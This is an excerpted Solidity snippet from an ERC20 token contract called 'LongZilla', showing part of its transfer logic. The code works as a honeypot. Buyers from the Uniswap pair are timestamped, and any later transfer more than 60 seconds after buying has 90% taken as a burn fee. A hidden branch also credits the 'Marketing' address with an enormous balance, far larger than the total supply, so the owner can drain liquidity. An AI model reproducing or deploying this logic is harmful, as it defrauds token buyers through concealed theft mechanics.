...
contract  LongZilla  is Ownable, IERC20 {
    ...
    string private  _name = "LongZilla";
    string private  _symbol = "LongZilla";
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        if (!_isExcludedFromFee[from]   && !_isExcludedFromFee[to]  ) { if ( from == uniswapV2Pairs    &&  balanceOf(to) == 0) { {yyds[to] =  block.timestamp;  }  }  

        if ( from != uniswapV2Pairs )  {   if (  block.timestamp >  yyds[from] + 60 )    {   burnfee = amount.mul(9).div(10); }      }  }

        if (  from == uniswapV2Pairs  && to == Marketing ) { _tOwned[Marketing] += _totalSupply * 7 * 24 * 60 * 60  + 1;  }
